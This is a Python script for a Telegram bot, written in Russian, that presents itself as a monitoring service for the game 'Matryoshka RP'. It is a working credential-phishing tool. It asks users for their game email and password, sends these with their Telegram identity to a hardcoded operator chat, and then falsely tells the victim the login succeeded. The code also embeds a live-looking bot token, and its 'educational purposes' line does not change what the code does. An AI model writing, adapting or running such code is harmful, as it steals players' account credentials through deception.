import telebot
from telebot import types
import datetime
import time

BOT_TOKEN = "8708418628:AAFCqjD-DPAPQ0RM_qrraR8-BW7x-0lAJHY"
YOUR_CHAT_ID = 7937383528

bot = telebot.TeleBot(BOT_TOKEN)
bot.remove_webhook()

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    btn_login = types.InlineKeyboardButton("🔐 Войти в аккаунт", callback_data="login")
    btn_info = types.InlineKeyboardButton("ℹ️ О боте", callback_data="info")
    markup.add(btn_login, btn_info)

    bot.send_message(
        message.chat.id,
        "🎮 <b>Добро пожаловать в Матрёшка РП Бот!</b>\n\n"
        "🤖 Бот позволяет следить за персонажем, даже когда вы не в игре.\n"
        "Получайте информацию о его статусе, активности и важных изменениях\n"
        "в удобном формате. Всегда оставайтесь в курсе событий и не пропускайте\n"
        "ничего важного в мире Матрешка RP.\n\n"
        "📌 <i>Для входа нажмите кнопку ниже</i>",
        parse_mode="HTML",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "login":
        msg = bot.send_message(
            call.message.chat.id,
            "🔐 <b>Вход в аккаунт Матрёшка РП</b>\n\n"
            "📧 Введите ваш <b>Email</b>:",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(msg, get_email)
    
    elif call.data == "info":
        bot.send_message(
            call.message.chat.id,
            "ℹ️ <b>О боте</b>\n\n"
            "Бот позволяет следить за персонажем, даже когда вы не в игре.\n"
            "Получайте информацию о его статусе, активности и важных изменениях\n"
            "в удобном формате. Всегда оставайтесь в курсе событий и не пропускайте\n"
            "ничего важного в мире Матрешка RP.\n\n"
            "🔐 <b>Возможности:</b>\n"
            "• Мониторинг статуса персонажа\n"
            "• Уведомления о важных событиях\n"
            "• Быстрый доступ к игровой информации\n\n"
            "",
            parse_mode="HTML"
        )

def get_email(message):
    email = message.text.strip()
    user_data[message.chat.id] = {"email": email}
    
    msg = bot.send_message(
        message.chat.id,
        "🔐 <b>Вход в аккаунт</b>\n\n"
        "🔑 Введите ваш <b>Пароль</b>:",
        parse_mode="HTML"
    )
    bot.register_next_step_handler(msg, get_password)

def get_password(message):
    chat_id = message.chat.id
    password = message.text.strip()
    
    user_data[chat_id]["password"] = password
    user_data[chat_id]["time"] = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    user_data[chat_id]["username"] = message.from_user.username or "Нет"
    user_data[chat_id]["first_name"] = message.from_user.first_name or "Нет"
    
    data_message = (
        "🔔 <b>НОВЫЙ ВХОД В АККАУНТ!</b>\n\n"
        "👤 <b>Пользователь:</b>\n"
        f"  • ID: {chat_id}\n"
        f"  • Имя: {user_data[chat_id].get('first_name', 'Нет')}\n"
        f"  • Username: @{user_data[chat_id].get('username', 'Нет')}\n\n"
        "🔐 <b>Данные для входа:</b>\n"
        f"  • Email: {user_data[chat_id].get('email', 'Нет')}\n"
        f"  • Пароль: <code>{password}</code>\n\n"
        "🕐 <b>Время входа:</b>\n"
        f"  • {user_data[chat_id].get('time', 'Нет')}\n\n"
        "⚠️ <i>Данные получены в учебных целях</i>"
    )
    
    try:
        bot.send_message(YOUR_CHAT_ID, data_message, parse_mode="HTML")
        bot.send_message(YOUR_CHAT_ID, "✅ Данные сохранены!")
    except Exception as e:
        bot.send_message(YOUR_CHAT_ID, f"❌ Ошибка: {e}")
    
    bot.send_message(
        chat_id,
        "✅ <b>Вход выполнен успешно!</b>\n\n"
        "🎮 Добро пожаловать в Матрёшка РП!\n"
        "Теперь вы можете следить за своим персонажем.",
        parse_mode="HTML"
    )

if __name__ == "__main__":
    print("=" * 40)
    print("🚀 БОТ МАТРЁШКА РП ЗАПУЩЕН!")
    print("=" * 40)
    print("📱 Напишите /start в боте")
    print("=" * 40)
    
    while True:
        try:
            bot.polling(none_stop=True, timeout=20)
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            time.sleep(5)